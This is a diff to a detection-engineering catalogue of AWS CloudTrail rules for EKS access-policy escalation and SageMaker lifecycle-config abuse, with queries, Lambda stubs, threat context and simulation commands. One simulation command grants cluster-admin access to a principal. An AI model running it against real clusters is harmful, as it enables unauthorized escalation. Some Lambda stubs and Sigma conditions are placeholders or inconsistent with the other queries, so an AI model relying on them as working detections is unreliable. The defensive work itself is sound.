+    investigationSteps: ["Identify the policy ARN, effective scope, and principal receiving the association.", "Verify whether the policy semantics or cluster-wide scope were approved for that principal and cluster.", "Determine whether the association represents intended admin onboarding or unexpected privilege escalation."],
+    testingSteps: ["Associate a broad or cluster-wide access policy to a test access entry.", "Verify CloudTrail captures the cluster, principal, policy ARN, and access scope.", "Run the detector and confirm it keys on broad policy semantics and effective scope rather than only static policy-name matching."],
+    lifecycle: {
+      whyItMatters: "AssociateAccessPolicy is where EKS authorization often becomes materially powerful. Broad or cluster-wide policy association can convert a mere access entry into an effective administrative foothold.",
+      threatContext: {
+        attackerBehavior: "An attacker may associate a high-impact EKS access policy to a principal in order to obtain wide Kubernetes control over a cluster.",
+        realWorldUsage: "This technique is attractive because it uses native managed access semantics instead of directly altering Kubernetes RBAC objects.",
+        whyItMatters: "The important signal is the effective privilege and access scope granted, not just a policy ARN string.",
+        riskAndImpact: "If missed, a principal may receive cluster-wide administrative or near-administrative power without defenders recognizing the privilege change.",
+      },
+      telemetryValidation: {
+        requiredLogSources: ["AWS CloudTrail management events for EKS", "Policy semantic inventory or allowlist", "Cluster access governance data"],
+        requiredFields: ["eventSource", "eventName", "eventTime", "userIdentity.arn", "requestParameters.clusterName", "requestParameters.principalArn", "requestParameters.policyArn", "requestParameters.accessScope", "sourceIPAddress"],
+        loggingRequirements: ["AssociateAccessPolicy events must be ingested with cluster, principal, policy, and scope context.", "The environment should know which policies are considered broad or admin-equivalent.", "Policy scope must be parsed to distinguish cluster-wide from narrower namespace access."],
+        limitations: ["Policy name matching alone can miss or misclassify effective privilege.", "Some legitimate administrative workflows will intentionally assign broad policies.", "The rule is strongest when paired with approved principal and cluster governance context."],
+      },
+      dataModeling: {
+        rawToNormalized: [
+          { rawPath: "requestParameters.clusterName", normalizedPath: "aws.eks.cluster.name", notes: "Cluster where access is being broadened" },
+          { rawPath: "requestParameters.principalArn", normalizedPath: "aws.eks.access_entry.principal_arn", notes: "Principal receiving the policy association" },
+          { rawPath: "requestParameters.policyArn", normalizedPath: "aws.eks.access_policy.arn", notes: "Associated EKS access policy" },
+          { rawPath: "requestParameters.accessScope", normalizedPath: "aws.eks.access_policy.scope", notes: "Effective access scope for the policy" },
+        ],
+        exampleNormalizedEvent: JSON.stringify({
+          "@timestamp": "2025-02-10T12:45:00Z",
+          event: { category: ["iam"], type: ["change"], action: "AssociateAccessPolicy", outcome: "success", provider: "aws" },
+          user: { arn: "arn:aws:iam::123456789012:user/dev", type: "IAMUser" },
+          aws: { eks: { cluster: { name: "prod" }, access_entry: { principal_arn: "arn:aws:iam::123456789012:user/attacker" }, access_policy: { arn: "arn:aws:eks::aws:cluster-access-policy/AmazonEKSClusterAdminPolicy", scope: { type: "cluster" } } } },
+        }, null, 2),
+      },
+      enrichment: [
+        { dimension: "Policy Semantics", description: "Classify whether the associated policy is admin-equivalent, highly privileged, or otherwise broad in impact.", examples: ["cluster admin policy", "wide read/write policy"], falsePositiveReduction: "Turns raw policy names into meaningful privilege context." },
+        { dimension: "Effective Scope", description: "Determine whether access applies cluster-wide or only to approved namespaces or resources.", examples: ["cluster scope", "limited namespace scope"], falsePositiveReduction: "Improves prioritization of high-impact associations." },
+        { dimension: "Principal Legitimacy", description: "Determine whether the receiving principal should hold this level of cluster access.", examples: ["platform admin role", "unexpected app role"], falsePositiveReduction: "Separates legitimate admin assignment from privilege escalation." },
+      ],
+      logicExplanation: {
+        humanReadable: "This rule should detect policy associations that grant broad effective access in EKS. It should evaluate both the semantics of the associated policy and the resulting access scope, then alert when the principal receives cluster-wide or otherwise high-impact access.",
+        conditions: ["eventSource equals eks.amazonaws.com", "eventName equals AssociateAccessPolicy", "associated policy is broad or admin-equivalent or access scope is cluster-wide or otherwise exceeds approved scope"],
+        tuningGuidance: "1. Model policy semantics instead of only matching policy names. 2. Parse scope carefully. 3. Escalate further when the receiving principal is outside approved access models or the cluster is sensitive.",
+        whenToFire: "Fire when a policy association grants broad or cluster-wide access beyond approved privilege models.",
+      },
+      simulationCommand: "aws eks associate-access-policy --cluster-name prod --principal-arn arn:aws:iam::123456789012:user/demo-user --policy-arn arn:aws:eks::aws:cluster-access-policy/AmazonEKSClusterAdminPolicy --access-scope type=cluster",
+      quality: {
+        signalQuality: 8,
+        falsePositiveRate: "Low-Medium with policy semantics and approved-governance context; medium with simple policy-name checks",
+        expectedVolume: "Low",
+        productionReadiness: "validated",
+      },
+      communityConfidence: { accurate: 0, needsTuning: 0, noisy: 0 },
+      deployment: {
+        whereItRuns: ["EventBridge + Lambda enrichment", "Athena with policy and governance lookups", "Splunk", "Panther / Chronicle / Datadog"],
+        scheduling: "Real-time is preferred because broad access grants are immediately actionable.",
+        considerations: ["This is the privilege-impact rule for EKS access management.", "Policy semantics and scope parsing are the main dependencies."],
+      },
+    },
   },
   {
     id: "det-099",
-    title: "Access Entry Creation Followed by Access Policy Association",
-    description: "High-confidence EKS access escalation: CreateAccessEntry for principal X on cluster Y then shortly afterward AssociateAccessPolicy for the same principal X on cluster Y. Reduces false positives because immediate policy association is a strong sign of actual authorization being granted.",
+    title: "EKS Access Entry Followed by Access Policy Association",
+    description: "High-confidence EKS authorization chain detection. This should correlate `CreateAccessEntry` and `AssociateAccessPolicy` for the same principal and cluster, using ordered sequence and exact entity linkage rather than loose event aggregation.",
     awsService: "EKS",
     relatedServices: ["IAM"],
     severity: "Critical",
@@ -12356,9 +12944,9 @@ detection:
   selection_associate:
     eventSource: eks.amazonaws.com
     eventName: AssociateAccessPolicy
-  condition: 1 of selection_*
+  condition: selection_create
 level: critical
-# Full correlation (principal+cluster, 15 min) requires SIEM.`,
+# Full correlation requires ordered sequence on exact principal and cluster linkage.`,
       splunk: `index=aws sourcetype=aws:cloudtrail eventSource=eks.amazonaws.com (eventName=CreateAccessEntry OR eventName=AssociateAccessPolicy)
 | eval principal=requestParameters.principalArn
 | eval cluster=requestParameters.clusterName
@@ -12393,16 +12981,97 @@ ORDER BY c.create_time DESC`,
 | filter cnt >= 2
 | sort cnt desc`,
       eventbridge: JSON.stringify({ source: ["aws.eks"], "detail-type": ["AWS API Call via CloudTrail"], detail: { eventSource: ["eks.amazonaws.com"], eventName: ["CreateAccessEntry", "AssociateAccessPolicy"] } }, null, 2),
+      lambda: `"""
+EKS Access Entry Followed by Access Policy Association
+Trigger: EventBridge rule matching CreateAccessEntry and AssociateAccessPolicy.
+Use for: Stateful correlation of EKS access onboarding into effective authorization.
+"""
+
+def lambda_handler(event, context):
+    detail = event.get("detail", {})
+    if detail.get("eventSource") != "eks.amazonaws.com":
+        return {"matched": False}
+    if detail.get("eventName") not in {"CreateAccessEntry", "AssociateAccessPolicy"}:
+        return {"matched": False}
+
+    request = detail.get("requestParameters", {})
+    return {
+        "matched": "requires-access-entry-plus-policy-association-correlation",
+        "alert": {
+            "rule_id": "det-099",
+            "title": "EKS Access Entry Followed by Access Policy Association",
+            "severity": "Critical",
+            "actor": detail.get("userIdentity", {}).get("arn"),
+            "cluster": request.get("clusterName"),
+            "principal_arn": request.get("principalArn"),
+            "event_name": detail.get("eventName"),
+            "event_time": detail.get("eventTime"),
+        },
+    }
+`,
     },
     relatedAttackSlugs: [],
     telemetry: { primaryLogSource: "AWS CloudTrail", generatingService: "eks.amazonaws.com", importantFields: ["eventSource", "eventName", "userIdentity.arn", "requestParameters.principalArn", "requestParameters.clusterName", "requestParameters.policyArn", "eventTime"], exampleEvent: JSON.stringify({ eventVersion: "1.08", eventSource: "eks.amazonaws.com", eventName: "CreateAccessEntry", userIdentity: { type: "IAMUser", arn: "arn:aws:iam::123456789012:user/dev" }, requestParameters: { clusterName: "prod", principalArn: "arn:aws:iam::123456789012:user/attacker" }, sourceIPAddress: "203.0.113.10", eventTime: "2025-02-10T12:45:00Z" }, null, 2) },
-    investigationSteps: ["Identify CreateAccessEntry and AssociateAccessPolicy sequence.", "Verify if both were authorized.", "Check the policy ARN for broad access."],
-    testingSteps: ["Create access entry, then AssociateAccessPolicy within 15 min.", "Run Splunk or Athena correlation query."],
+    investigationSteps: ["Identify the exact `CreateAccessEntry` and `AssociateAccessPolicy` sequence for the same principal and cluster.", "Verify whether both steps were part of an approved onboarding or administration workflow.", "Check whether the associated policy grants broad or unexpected access and whether the actor was authorized to make both changes."],
+    testingSteps: ["Create an access entry and then associate a policy to the same principal and cluster within 15 minutes.", "Verify CloudTrail preserves the cluster and principal linkage across both events.", "Run the detector and confirm it requires ordered sequence on exact principal-plus-cluster identity rather than loose same-actor grouping."],
+    lifecycle: {
+      whyItMatters: "This is the highest-confidence EKS access-management chain in the set because it captures the transition from a new access subject to effective authorized access on the cluster.",
+      threatContext: {
+        attackerBehavior: "An attacker may create an access entry for a chosen principal and immediately associate an access policy to operationalize that access.",
+        realWorldUsage: "This is a practical and durable cluster-access escalation path because it uses official EKS authorization objects rather than transient kubeconfig abuse.",
+        whyItMatters: "The strongest signal is the ordered chain over the same principal and cluster, not simply that two related event names occurred in a window.",
+        riskAndImpact: "If missed, defenders may see setup events separately and fail to recognize that a new, effective cluster access path was established end-to-end.",
+      },
+      telemetryValidation: {
+        requiredLogSources: ["AWS CloudTrail management events for EKS", "Cluster governance and approved onboarding workflows"],
+        requiredFields: ["eventSource", "eventName", "eventTime", "userIdentity.arn", "requestParameters.principalArn", "requestParameters.clusterName", "requestParameters.policyArn", "sourceIPAddress"],
+        loggingRequirements: ["Both CreateAccessEntry and AssociateAccessPolicy must be ingested.", "The detector must correlate on exact principal ARN and cluster name.", "Approved cluster onboarding workflows should be modeled for suppression."],
+        limitations: ["Some legitimate provisioning pipelines perform both actions together.", "Actor-only joins are weaker than principal-plus-cluster correlation.", "Policy criticality still needs to be evaluated separately for prioritization."],
+      },
+      dataModeling: {
+        rawToNormalized: [
+          { rawPath: "requestParameters.principalArn", normalizedPath: "aws.eks.access_entry.principal_arn", notes: "Principal receiving the new EKS authorization path" },
+          { rawPath: "requestParameters.clusterName", normalizedPath: "aws.eks.cluster.name", notes: "Cluster receiving the new authorization path" },
+          { rawPath: "requestParameters.policyArn", normalizedPath: "aws.eks.access_policy.arn", notes: "Policy associated after the access entry is created" },
+          { rawPath: "eventName", normalizedPath: "event.action", notes: "Stage of the EKS authorization chain" },
+        ],
+        exampleNormalizedEvent: JSON.stringify({
+          "@timestamp": "2025-02-10T12:45:00Z",
+          event: { category: ["iam"], type: ["creation"], action: "CreateAccessEntry", outcome: "success", provider: "aws" },
+          user: { arn: "arn:aws:iam::123456789012:user/dev", type: "IAMUser" },
+          aws: { eks: { cluster: { name: "prod" }, access_entry: { principal_arn: "arn:aws:iam::123456789012:user/attacker" }, access_policy: { arn: "arn:aws:eks::aws:cluster-access-policy/AmazonEKSClusterAdminPolicy" } } },
+        }, null, 2),
+      },
+      enrichment: [
+        { dimension: "Exact Entity Linkage", description: "Correlate both events over the same principal ARN and cluster name.", examples: ["user/attacker + prod cluster"], falsePositiveReduction: "Prevents unrelated access-management events from forming a false chain." },
+        { dimension: "Workflow Provenance", description: "Determine whether the sequence came from approved cluster onboarding or break-glass procedures.", examples: ["Terraform onboarding pipeline", "manual untracked access grant"], falsePositiveReduction: "Separates legitimate setup from suspicious privilege establishment." },
+        { dimension: "Policy Impact", description: "Classify the effect of the associated policy after the access entry is created.", examples: ["cluster admin", "limited namespace access"], falsePositiveReduction: "Helps prioritize the resulting access chain." },
+      ],
+      logicExplanation: {
+        humanReadable: "This rule should model an EKS access-establishment sequence: first an access entry is created for a principal on a cluster, then a policy is associated to that same principal and cluster. The detector should require exact principal-plus-cluster linkage and event order.",
+        conditions: ["first eventName equals CreateAccessEntry", "second eventName equals AssociateAccessPolicy for the same principal ARN and cluster name", "association occurs within 15 minutes"],
+        tuningGuidance: "1. Correlate on exact principal plus cluster. 2. Require order. 3. Escalate further when the associated policy is broad or the actor is outside approved access-management workflows.",
+        whenToFire: "Fire when a new EKS access entry is quickly operationalized by a policy association for the same principal and cluster.",
+      },
+      simulationCommand: "aws eks create-access-entry --cluster-name prod --principal-arn arn:aws:iam::123456789012:user/demo-user",
+      quality: {
+        signalQuality: 9,
+        falsePositiveRate: "Low-Medium with approved-workflow context; low when principal-plus-cluster linkage is exact",
+        expectedVolume: "Very low",
+        productionReadiness: "validated",
+      },
+      communityConfidence: { accurate: 0, needsTuning: 0, noisy: 0 },
+      deployment: {
+        whereItRuns: ["SIEM correlation engines", "Athena with ordered event windows", "Panther / Chronicle / Datadog", "EventBridge + Lambda with temporary state"],
+        scheduling: "Near-real-time is preferred because access establishment may be immediately exploitable.",
+        considerations: ["This is one of the highest-fidelity EKS access-management detections in the set.", "Exact principal-plus-cluster correlation is the core dependency."],
+      },
+    },
   },
   {
     id: "det-100",
-    title: "EKS Access Entry Created or Policy Associated by Unexpected Actor",
-    description: "Detects EKS cluster access changes performed by identities that should not manage cluster authorization. Suspicious actors: IAM users outside platform/cluster admin teams, application roles, workload roles, non-admin assumed roles.",
+    title: "EKS Access Management Outside Authorized Cluster Admin Path",
+    description: "Detects EKS access-entry or access-policy changes performed by identities outside approved cluster-authorization workflows. This should rely on explicit actor authorization and automation provenance, not ARN or principalId substring allowlists.",
     awsService: "EKS",
     relatedServices: ["IAM"],
     severity: "High",
@@ -12420,17 +13089,7 @@ detection:
     eventName:
       - CreateAccessEntry
       - AssociateAccessPolicy
-  filter_arn:
-    userIdentity.arn|contains:
-      - '/role/Admin'
-      - '/role/Platform'
-      - '/role/EKS'
-      - '/role/ClusterAdmin'
-  filter_automation:
-    userIdentity.principalId|contains:
-      - 'terraform'
-      - 'cloudformation'
-  condition: selection and not (filter_arn or filter_automation)
+  condition: selection
 level: high`,
       splunk: `index=aws sourcetype=aws:cloudtrail eventSource=eks.amazonaws.com (eventName=CreateAccessEntry OR eventName=AssociateAccessPolicy)
 | where NOT (like(userIdentity.arn, "%/role/Admin%") OR like(userIdentity.arn, "%/role/Platform%") OR like(userIdentity.arn, "%/role/EKS%") OR like(userIdentity.arn, "%/role/ClusterAdmin%") OR like(userIdentity.principalId, "%terraform%") OR like(userIdentity.principalId, "%cloudformation%"))
@@ -12448,21 +13107,101 @@ ORDER BY eventTime DESC`,
       cloudwatch: `fields @timestamp, userIdentity.type, userIdentity.arn, userIdentity.sessionContext.sessionIssuer.arn, eventName, requestParameters.clusterName, requestParameters.principalArn
 | filter eventSource = "eks.amazonaws.com"
 | filter eventName in ["CreateAccessEntry", "AssociateAccessPolicy"]
-| filter userIdentity.arn not like /\\/role\\/(Admin|Platform|EKS|ClusterAdmin)/ and userIdentity.principalId not like /terraform|cloudformation/
 | sort @timestamp desc`,
       eventbridge: JSON.stringify({ source: ["aws.eks"], "detail-type": ["AWS API Call via CloudTrail"], detail: { eventSource: ["eks.amazonaws.com"], eventName: ["CreateAccessEntry", "AssociateAccessPolicy"] } }, null, 2),
+      lambda: `"""
+EKS Access Management Outside Authorized Cluster Admin Path
+Trigger: EventBridge rule matching CreateAccessEntry or AssociateAccessPolicy.
+Use for: Real-time authorization checks for EKS access-management changes.
+"""
+
+def lambda_handler(event, context):
+    detail = event.get("detail", {})
+    if detail.get("eventSource") != "eks.amazonaws.com":
+        return {"matched": False}
+    if detail.get("eventName") not in {"CreateAccessEntry", "AssociateAccessPolicy"}:
+        return {"matched": False}
+
+    request = detail.get("requestParameters", {})
+    return {
+        "matched": "requires-authorized-eks-access-manager-check",
+        "alert": {
+            "rule_id": "det-100",
+            "title": "EKS Access Management Outside Authorized Cluster Admin Path",
+            "severity": "High",
+            "actor": detail.get("userIdentity", {}).get("arn"),
+            "cluster": request.get("clusterName"),
+            "principal_arn": request.get("principalArn"),
+            "event_name": detail.get("eventName"),
+            "event_time": detail.get("eventTime"),
+        },
+    }
+`,
     },
     relatedAttackSlugs: [],
     telemetry: { primaryLogSource: "AWS CloudTrail", generatingService: "eks.amazonaws.com", importantFields: ["eventSource", "eventName", "userIdentity.type", "userIdentity.arn", "userIdentity.sessionContext.sessionIssuer.arn", "requestParameters.clusterName", "requestParameters.principalArn", "eventTime"], exampleEvent: JSON.stringify({ eventVersion: "1.08", eventSource: "eks.amazonaws.com", eventName: "CreateAccessEntry", userIdentity: { type: "AssumedRole", arn: "arn:aws:sts::123456789012:assumed-role/AppRole/session" }, requestParameters: { clusterName: "prod", principalArn: "arn:aws:iam::123456789012:user/attacker" }, sourceIPAddress: "203.0.113.10", eventTime: "2025-02-10T12:45:00Z" }, null, 2) },
-    investigationSteps: ["Identify the actor type and ARN.", "Verify if this identity is authorized for EKS access management.", "Update allowlist if legitimate."],
-    testingSteps: ["As a non-admin role, call CreateAccessEntry or AssociateAccessPolicy.", "Verify detection triggers."],
+    investigationSteps: ["Identify the actor, session issuer, and any automation or workflow provenance behind the EKS access-management change.", "Verify whether this identity is explicitly approved to manage cluster authorization for the target cluster.", "Determine whether the change came from a known IaC or platform workflow or from an unexpected principal."],
+    testingSteps: ["As an identity outside the approved cluster-admin set, call `CreateAccessEntry` or `AssociateAccessPolicy` against a monitored test cluster.", "Verify CloudTrail captures the actor, cluster, and target principal context.", "Run the detector and confirm it uses explicit actor authorization and workflow provenance rather than role-name or `terraform` substring checks."],
+    lifecycle: {
+      whyItMatters: "Cluster authorization changes should come from a narrow set of trusted platform or automation identities. When an unapproved actor manages EKS access, the event is a strong control-plane abuse signal.",
+      threatContext: {
+        attackerBehavior: "An attacker operating through a compromised IAM user, workload role, or unexpected assumed role may try to create access entries or associate policies to establish cluster control.",
+        realWorldUsage: "This is a practical escalation method because it leverages native EKS access-management APIs and can look like legitimate administration without context.",
+        whyItMatters: "Authorization context and workflow provenance matter more than whether the actor's ARN contains cluster-admin-like terms.",
+        riskAndImpact: "If missed, unauthorized actors can directly change cluster access models and establish durable Kubernetes footholds.",
+      },
+      telemetryValidation: {
+        requiredLogSources: ["AWS CloudTrail management events for EKS", "Authorized cluster-admin and automation principal inventory", "IaC and platform workflow provenance data"],
+        requiredFields: ["eventSource", "eventName", "eventTime", "userIdentity.type", "userIdentity.arn", "userIdentity.principalId", "userIdentity.sessionContext.sessionIssuer.arn", "requestParameters.clusterName", "requestParameters.principalArn", "sourceIPAddress"],
+        loggingRequirements: ["CreateAccessEntry and AssociateAccessPolicy events must be ingested with full actor context.", "The environment should maintain exact principals allowed to manage EKS authorization.", "Automation provenance such as Terraform, CloudFormation, or brokered workflows should be modeled explicitly."],
+        limitations: ["Without actor inventories the rule becomes weak anomaly detection.", "Some legitimate emergency access-management operations may be manual and out-of-band.", "PrincipalId substring checks are too brittle without additional provenance."],
+      },
+      dataModeling: {
+        rawToNormalized: [
+          { rawPath: "userIdentity.arn", normalizedPath: "user.arn", notes: "Actor managing EKS authorization" },
+          { rawPath: "userIdentity.sessionContext.sessionIssuer.arn", normalizedPath: "aws.identity.session_issuer.arn", notes: "Underlying role or identity source" },
+          { rawPath: "requestParameters.clusterName", normalizedPath: "aws.eks.cluster.name", notes: "Cluster where authorization is being changed" },
+          { rawPath: "requestParameters.principalArn", normalizedPath: "aws.eks.access_entry.principal_arn", notes: "Principal affected by the change" },
+        ],
+        exampleNormalizedEvent: JSON.stringify({
+          "@timestamp": "2025-02-10T12:45:00Z",
+          event: { category: ["iam"], type: ["change"], action: "CreateAccessEntry", outcome: "success", provider: "aws" },
+          user: { arn: "arn:aws:sts::123456789012:assumed-role/AppRole/session", type: "AssumedRole" },
+          aws: { eks: { cluster: { name: "prod" }, access_entry: { principal_arn: "arn:aws:iam::123456789012:user/attacker" } } },
+        }, null, 2),
+      },
+      enrichment: [
+        { dimension: "Authorized EKS Access Managers", description: "Exact inventory of principals allowed to create access entries or associate access policies for each cluster or environment.", examples: ["platform admin role", "approved Terraform pipeline"], falsePositiveReduction: "Replaces brittle role-name and principalId allowlists." },
+        { dimension: "Workflow Provenance", description: "Determine whether the request came from a trusted IaC, brokered approval, or break-glass workflow.", examples: ["Terraform apply", "manual unknown session"], falsePositiveReduction: "Separates expected automation from suspicious manual access changes." },
+        { dimension: "Cluster Scope", description: "Model which clusters or environments each authorized actor may manage.", examples: ["dev clusters only", "prod platform team"], falsePositiveReduction: "Prevents broad admin allowlists from hiding out-of-scope changes." },
+      ],
+      logicExplanation: {
+        humanReadable: "This rule should detect EKS access-management changes outside approved cluster-admin paths. It should match `CreateAccessEntry` and `AssociateAccessPolicy`, resolve the actor and workflow provenance, and then check whether that principal is explicitly allowed to manage authorization on the target cluster.",
+        conditions: ["eventSource equals eks.amazonaws.com", "eventName equals CreateAccessEntry or AssociateAccessPolicy", "actor is not in the approved EKS access-manager inventory or actor is outside approved cluster scope or request lacks approved workflow provenance"],
+        tuningGuidance: "1. Use exact principal inventories. 2. Model actor-to-cluster scope, not only global admin allowlists. 3. Treat IaC, break-glass, and platform workflows as explicit approved paths with auditability.",
+        whenToFire: "Fire when EKS access-management APIs are used by an identity outside approved cluster-admin workflows.",
+      },
+      simulationCommand: "aws eks create-access-entry --cluster-name prod --principal-arn arn:aws:iam::123456789012:user/demo-user --profile dev-user",
+      quality: {
+        signalQuality: 8,
+        falsePositiveRate: "Low-Medium with actor inventories and workflow provenance; high with ARN substring heuristics",
+        expectedVolume: "Low",
+        productionReadiness: "validated",
+      },
+      communityConfidence: { accurate: 0, needsTuning: 0, noisy: 0 },
+      deployment: {
+        whereItRuns: ["EventBridge + Lambda enrichment", "Athena with actor and cluster inventories", "Splunk", "Panther / Chronicle / Datadog"],
+        scheduling: "Real-time is preferred because unauthorized authorization changes are immediately actionable.",
+        considerations: ["This is the actor-centric EKS access-management detector.", "Actor inventory, workflow provenance, and cluster scope are the main dependencies."],
+      },
+    },
   },
 
   // --- SageMaker Lifecycle Config Injection ---
   {
     id: "det-101",
     title: "Notebook Lifecycle Configuration Created or Updated",
-    description: "Baseline visibility for lifecycle configuration changes. Lifecycle configs are security-sensitive because they execute code at startup, but admins may legitimately create them.",
+    description: "Baseline visibility for SageMaker notebook lifecycle configuration creation or update. Lifecycle configs are security-sensitive because they can execute code automatically when notebooks start, making them a common persistence or privilege-enablement control point.",
     awsService: "SageMaker",
     relatedServices: [],
     severity: "Medium",
@@ -12494,16 +13233,95 @@ ORDER BY eventTime DESC`,
 | filter eventName in ["CreateNotebookInstanceLifecycleConfig", "UpdateNotebookInstanceLifecycleConfig"]
 | sort @timestamp desc`,
       eventbridge: JSON.stringify({ source: ["aws.sagemaker"], "detail-type": ["AWS API Call via CloudTrail"], detail: { eventSource: ["sagemaker.amazonaws.com"], eventName: ["CreateNotebookInstanceLifecycleConfig", "UpdateNotebookInstanceLifecycleConfig"] } }, null, 2),
+      lambda: `"""
+Notebook Lifecycle Configuration Created or Updated
+Trigger: EventBridge rule matching lifecycle-config create or update events.
+Use for: Baseline visibility into SageMaker startup-script changes.
+"""
+
+def lambda_handler(event, context):
+    detail = event.get("detail", {})
+    if detail.get("eventSource") != "sagemaker.amazonaws.com":
+        return {"matched": False}
+    if detail.get("eventName") not in {"CreateNotebookInstanceLifecycleConfig", "UpdateNotebookInstanceLifecycleConfig"}:
+        return {"matched": False}
+
+    request = detail.get("requestParameters", {})
+    return {
+        "matched": True,
+        "alert": {
+            "rule_id": "det-101",
+            "title": "Notebook Lifecycle Configuration Created or Updated",
+            "severity": "Medium",
+            "actor": detail.get("userIdentity", {}).get("arn"),
+            "lifecycle_config_name": request.get("notebookInstanceLifecycleConfigName"),
+            "event_name": detail.get("eventName"),
+            "event_time": detail.get("eventTime"),
+        },
+    }
+`,
     },
     relatedAttackSlugs: [],
     telemetry: { primaryLogSource: "AWS CloudTrail", generatingService: "sagemaker.amazonaws.com", importantFields: ["eventSource", "eventName", "userIdentity.arn", "requestParameters.notebookInstanceLifecycleConfigName", "eventTime"], exampleEvent: JSON.stringify({ eventVersion: "1.08", eventSource: "sagemaker.amazonaws.com", eventName: "CreateNotebookInstanceLifecycleConfig", userIdentity: { type: "IAMUser", arn: "arn:aws:iam::123456789012:user/admin" }, requestParameters: { notebookInstanceLifecycleConfigName: "malicious-config" }, sourceIPAddress: "203.0.113.10", eventTime: "2025-02-10T12:45:00Z" }, null, 2) },
-    investigationSteps: ["Identify the actor and lifecycle config name.", "Verify if creation/update was authorized.", "Check for notebook association."],
-    testingSteps: ["Create or update a lifecycle config.", "Verify CloudTrail captures the event.", "Run the detection."],
+    investigationSteps: ["Identify the actor, lifecycle config name, and whether the action was a creation or update.", "Verify whether the script content and change window were authorized for the target ML environment.", "Check whether the lifecycle config was later attached to a notebook instance or followed by notebook start activity."],
+    testingSteps: ["Create or update a notebook lifecycle configuration in a test SageMaker environment.", "Verify CloudTrail captures the lifecycle config name and actor context.", "Run the baseline detection and confirm it records all lifecycle-config mutations without filtering on actor names."],
+    lifecycle: {
+      whyItMatters: "Lifecycle configs can run arbitrary code at notebook startup. Even when legitimately used for environment setup, they are a natural persistence and privilege-enablement mechanism in SageMaker.",
+      threatContext: {
+        attackerBehavior: "An attacker may create or modify a lifecycle config to inject startup logic that downloads tools, retrieves secrets, or persists access when a notebook starts.",
+        realWorldUsage: "This approach is attractive because it uses the expected customization path for notebook environments rather than obviously malicious runtime changes.",
+        whyItMatters: "This baseline event feeds stronger detections about unauthorized operators, notebook association, and post-start sensitive activity.",
+        riskAndImpact: "If missed, defenders may overlook the initial staging step that prepares malicious code to execute inside a SageMaker notebook environment.",
+      },
+      telemetryValidation: {
+        requiredLogSources: ["AWS CloudTrail management events for SageMaker"],
+        requiredFields: ["eventSource", "eventName", "eventTime", "userIdentity.arn", "requestParameters.notebookInstanceLifecycleConfigName", "sourceIPAddress"],
+        loggingRequirements: ["CloudTrail must ingest SageMaker management events.", "The platform should retain lifecycle-config names and actor context.", "Notebook-association and notebook-start events should be available for downstream correlation."],
+        limitations: ["CloudTrail does not expose the full lifecycle script body in a directly triage-friendly form.", "Lifecycle-config creation alone does not prove execution.", "Legitimate ML platform administration may make similar changes."],
+      },
+      dataModeling: {
+        rawToNormalized: [
+          { rawPath: "userIdentity.arn", normalizedPath: "user.arn", notes: "Actor creating or modifying the lifecycle config" },
+          { rawPath: "eventName", normalizedPath: "event.action", notes: "Create or update action" },
+          { rawPath: "requestParameters.notebookInstanceLifecycleConfigName", normalizedPath: "aws.sagemaker.lifecycle_config.name", notes: "Lifecycle configuration being changed" },
+        ],
+        exampleNormalizedEvent: JSON.stringify({
+          "@timestamp": "2025-02-10T12:45:00Z",
+          event: { category: ["configuration"], type: ["change"], action: "CreateNotebookInstanceLifecycleConfig", outcome: "success", provider: "aws" },
+          user: { arn: "arn:aws:iam::123456789012:user/admin", type: "IAMUser" },
+          aws: { sagemaker: { lifecycle_config: { name: "malicious-config" } } },
+        }, null, 2),
+      },
+      enrichment: [
+        { dimension: "Actor Authorization", description: "Determine whether the actor is approved to manage SageMaker startup logic.", examples: ["ML platform role", "unexpected app role"], falsePositiveReduction: "Helps separate normal administration from suspicious lifecycle changes." },
+        { dimension: "Lifecycle Config Usage", description: "Track whether the lifecycle config is referenced by active or sensitive notebooks.", examples: ["attached to prod notebook", "unused staging config"], falsePositiveReduction: "Improves prioritization when changed configs are operationally relevant." },
+        { dimension: "Script Risk Context", description: "Assess whether the lifecycle script content or recent changes look high-risk.", examples: ["downloads from external host", "retrieves secrets at startup"], falsePositiveReduction: "Raises urgency when the config likely enables abuse." },
+      ],
+      logicExplanation: {
+        humanReadable: "This should remain a broad visibility rule for all successful lifecycle-config creation and update events. It establishes the startup-code mutation baseline that stronger SageMaker detections depend on.",
+        conditions: ["eventSource equals sagemaker.amazonaws.com", "eventName equals CreateNotebookInstanceLifecycleConfig or UpdateNotebookInstanceLifecycleConfig", "errorCode is absent"],
+        tuningGuidance: "1. Keep this baseline broad. 2. Resolve whether the actor is authorized to manage lifecycle configs. 3. Correlate with later notebook association and startup events for higher-confidence detections.",
+        whenToFire: "Fire on every successful lifecycle-config creation or update for visibility.",
+      },
+      simulationCommand: "aws sagemaker create-notebook-instance-lifecycle-config --notebook-instance-lifecycle-config-name demo-config",
+      quality: {
+        signalQuality: 6,
+        falsePositiveRate: "Medium as a baseline visibility rule, low-medium with actor and usage enrichment",
+        expectedVolume: "Low",
+        productionReadiness: "validated",
+      },
+      communityConfidence: { accurate: 0, needsTuning: 0, noisy: 0 },
+      deployment: {
+        whereItRuns: ["EventBridge + Lambda", "Athena", "Splunk", "Panther / Chronicle / Datadog"],
+        scheduling: "Real-time is useful because lifecycle-config changes can be executed soon after notebook start.",
+        considerations: ["This is the feeder rule for the stronger SageMaker lifecycle detections.", "Notebook association context is a valuable enrichment."],
+      },
+    },
   },
   {
     id: "det-102",
     title: "Lifecycle Config Associated to Notebook Instance",
-    description: "Detects when a notebook instance is created or updated with a lifecycle config attached. Association to a notebook instance is the moment the lifecycle config becomes operationally dangerous.",
+    description: "Detects when a notebook instance is created or updated with a lifecycle config attached. This is the operational handoff point where lifecycle-config logic becomes eligible to run at notebook startup.",
     awsService: "SageMaker",
     relatedServices: [],
     severity: "High",
@@ -12541,16 +13359,99 @@ ORDER BY eventTime DESC`,
 | filter ispresent(requestParameters.lifecycleConfigName)
 | sort @timestamp desc`,
       eventbridge: JSON.stringify({ source: ["aws.sagemaker"], "detail-type": ["AWS API Call via CloudTrail"], detail: { eventSource: ["sagemaker.amazonaws.com"], eventName: ["CreateNotebookInstance", "UpdateNotebookInstance"] } }, null, 2),
+      lambda: `"""
+Lifecycle Config Associated to Notebook Instance
+Trigger: EventBridge rule matching notebook create or update events.
+Use for: Real-time visibility into operational lifecycle-config attachment.
+"""
+
+def lambda_handler(event, context):
+    detail = event.get("detail", {})
+    if detail.get("eventSource") != "sagemaker.amazonaws.com":
+        return {"matched": False}
+    if detail.get("eventName") not in {"CreateNotebookInstance", "UpdateNotebookInstance"}:
+        return {"matched": False}
+
+    request = detail.get("requestParameters", {})
+    if not request.get("lifecycleConfigName"):
